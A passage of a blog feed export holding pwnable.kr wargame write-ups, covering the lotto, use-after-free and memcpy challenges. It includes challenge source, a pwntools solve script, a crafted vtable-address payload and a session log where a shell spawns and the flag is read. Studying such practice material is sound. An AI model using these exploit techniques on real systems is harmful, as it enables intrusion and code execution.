class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// menu</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve-4"><a href="#solve-4" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level='debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> <span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"./lotto"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'3. Exit\n'</span><span class="token punctuation">)</span>  r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>  r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Submit your 6 lotto bytes :'</span><span class="token punctuation">)</span>  r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">sorry mom<span class="token punctuation">..</span>. I FORGOT to check duplicate numbers<span class="token punctuation">..</span>. :<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>[Toddler’s Bottle] is over!!!<br>I have been very busy for a long time in the past.<br>But now Toddler’s Bottle is over~<br>GO GO GO!</p>]]></content>
      
      
      <categories>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwnable.kr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr_2</title>
      <link href="/2018/07/27/pwnable-kr-2/"/>
      <url>/2018/07/27/pwnable-kr-2/</url>
      
        <content type="html"><![CDATA[<h1 id="13-uaf"><a href="#13-uaf" class="headerlink" title="13.uaf"></a>13.uaf</h1><h2 id="question"><a href="#question" class="headerlink" title="question"></a>question</h2><a id="more"></a><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Human</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">private</span><span class="token operator">:</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">protected</span><span class="token operator">:</span>  <span class="token keyword">int</span> age<span class="token punctuation">;</span>  string name<span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Man</span><span class="token operator">:</span> <span class="token keyword">public</span> Human<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>  <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    Human<span class="token operator">::</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Woman</span><span class="token operator">:</span> <span class="token keyword">public</span> Human<span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>                <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                Human<span class="token operator">::</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  Human<span class="token operator">*</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Human<span class="token operator">*</span> w <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t len<span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>  <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>    cin <span class="token operator">>></span> op<span class="token punctuation">;</span>    <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        m<span class="token operator">-</span><span class="token operator">></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token operator">-</span><span class="token operator">></span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        len <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"your data is allocated"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        <span class="token keyword">delete</span> m<span class="token punctuation">;</span>        <span class="token keyword">delete</span> w<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">"print '\x68\x15\x40\x00\x00\x00\x00\x00'"</span> <span class="token operator">></span>/tmp/poc./uaf 24 /tmp/poc1. use2. after3. <span class="token function">free</span>31. use2. after3. <span class="token function">free</span>2your data is allocated1. use2. after3. <span class="token function">free</span>2your data is allocated1. use2. after3. <span class="token function">free</span>1$ <span class="token function">ls</span>flag  uaf  uaf.cpp$ <span class="token function">cat</span> flagyay_f1ag_aft3r_pwning<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-bash"><code class="language-bash">yay_f1ag_aft3r_pwning<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="14-memcpy"><a href="#14-memcpy" class="headerlink" title="14.memcpy"></a>14.memcpy</h1><h2 id="question-1"><a href="#question-1" class="headerlink" title="question"></a>question</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token function">rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"rdtsc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    dest<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">fast_memcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">,</span> size_t len<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  size_t i<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 64-byte block fast copy</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">>=</span> <span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    i <span class="token operator">=</span> len <span class="token operator">/</span> <span class="token number">64</span><span class="token punctuation">;</span>    len <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">64</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">--</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      __asm__ <span class="token function">__volatile__</span> <span class="token punctuation">(</span>      <span class="token string">"movdqa (%0), %%xmm0\n"</span>      <span class="token string">"movdqa 16(%0), %%xmm1\n"</span>      <span class="token string">"movdqa 32(%0), %%xmm2\n"</span>      <span class="token string">"movdqa 48(%0), %%xmm3\n"</span>      <span class="token string">"movntps %%xmm0, (%1)\n"</span>      <span class="token string">"movntps %%xmm1, 16(%1)\n"</span>      <span class="token string">"movntps %%xmm2, 32(%1)\n"</span>      <span class="token string">"movntps %%xmm3, 48(%1)\n"</span>      <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token string">"r"</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dest <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>      src <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// byte-to-byte slow copy</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span> <span class="token function">slow_memcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> dest<span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _IOLBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hey, I have a boring assignment for CS class.. :(\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The assignment is simple.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- What is the best implementation of memcpy?        -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 1. implement your own slow/fast version of memcpy -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 2. compare them with various size of data         -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- 3. conclude your experiment and submit report     -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-----------------------------------------------------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, just help me out with my experiment and get flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No fancy hacking, I promise :D\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">;</span>  <span class="token keyword">int</span> e<span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> src<span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> dest<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> high<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// allocate memory</span>  <span class="token keyword">char</span><span class="token operator">*</span> cache1 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span><span class="token operator">*</span> cache2 <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x4000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  src <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x2000</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> MAP_PRIVATE<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  size_t sizes<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// setup experiment parameters</span>  <span class="token keyword">for</span><span class="token punctuation">(</span>e<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span> e<span class="token operator">&lt;</span><span class="token number">14</span><span class="token punctuation">;</span> e<span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 2^13 = 8K</span>    low <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    high <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"specify the memcpy amount between %d ~ %d : "</span><span class="token punctuation">,</span> low<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> size <span class="token operator">&lt;</span> low <span class="token operator">||</span> size <span class="token operator">></span> high <span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"don't mess with the experiment.\n"</span><span class="token 